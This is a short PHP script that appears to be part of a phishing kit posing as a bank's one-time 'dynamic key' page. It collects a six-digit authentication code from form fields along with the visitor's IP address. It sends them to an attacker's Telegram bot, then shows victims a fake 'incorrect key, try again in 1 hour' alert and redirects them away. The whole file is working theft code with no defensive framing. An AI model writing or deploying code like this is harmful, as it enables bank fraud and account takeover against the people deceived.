<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('datos_de_tel.php');

if ( isset ($_POST['num1']) && isset ($_POST['num2']) && isset ($_POST['num3']) && isset ($_POST['num4']) && isset ($_POST['num5']) && isset ($_POST['num6'])){

$message = "CODIGO #2\r\n".$_POST['num1']."".$_POST['num2']."".$_POST['num3']."".$_POST['num4']."".$_POST['num5']."".$_POST['num6']."\r\nIP ".$userp."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
echo '<script language="javascript">alert("Clave Dinamica Incorrecta, por favor intente nuevamente en 1 hora");
</script>';

}else{ header ('location: index.html'); exit(); }

?>
<html>
<head>
<META HTTP-EQUIV="REFRESH" CONTENT="0;index.html">
</head>
<body>